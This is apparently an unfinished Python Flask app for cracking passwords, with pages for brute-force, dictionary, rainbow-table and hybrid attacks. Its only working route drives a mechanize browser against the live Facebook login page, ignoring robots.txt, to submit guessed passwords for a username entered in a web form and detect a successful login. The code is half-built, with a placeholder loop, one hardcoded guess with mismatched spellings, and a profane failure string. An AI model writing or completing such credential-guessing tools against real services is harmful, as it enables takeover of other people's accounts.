import mechanize
from flask import Flask, render_template, request
app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')
@app.route('/bruteforce')
def bruteforce():
    return render_template('bruteforce.html')
@app.route('/dictionary')
def dictionary():
    return render_template('dictionary.html')
@app.route('/rainbow')
def rainbow():
    return render_template('rainbow.html')
@app.route('/hybrid')
def hybrid():
    return render_template('hybrid.html')
@app.route('/hello')
def hello():
    return 'hello world!'
@app.route('/run_brute_force', methods = ['POST','GET'])
def brute_force_alg():
    #username, website, passwordlength, lengthparam, charset
    minpasswordlength = request.form['passwordlength1']
    maxpasswordlength = request.form['passwordlength2']
    username = request.form['accusername']
    charset = request.form['charset']
    website = request.form['website']
    if website == "Facebook":
        password = length_parameter_check(username, minpasswordlength, charset, maxpasswordlength)
    # elif website == "yahoo":
        #password = length_parameter_check(username, passwordlength, charset)
    return render_template('result.html', username = username, password = password)

def length_parameter_check(username, minpasswordlength, charset, maxpasswordlength):
        for x in range(1,int(minpasswordlength)+1):
            for y in range(1,x+1):
                print("test")
        if(facebook_form_filler(username, "gobuckyes")):
            return "gobuckeyes"
        else:
            return "fuck"
def facebook_form_filler(email, password):
    br = mechanize.Browser()
    #br.set_all_readonly(False)    # allow everything to be written to
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://www.facebook.com")
    br.form = list(br.forms())[0]
    br.form.set_all_readonly(False) 
    for control in br.form.controls:
        #print(control)
        if control.type == 'password':
            print("found password")

        if control.type == 'email':
            print("found email")
        #print("type={}, name={}".format(control.type, control.name))
    br.form['email'] = email
    br.form['pass'] = password
    result = br.submit(id='u_0_2')
    return result.geturl() == "https://www.facebook.com/"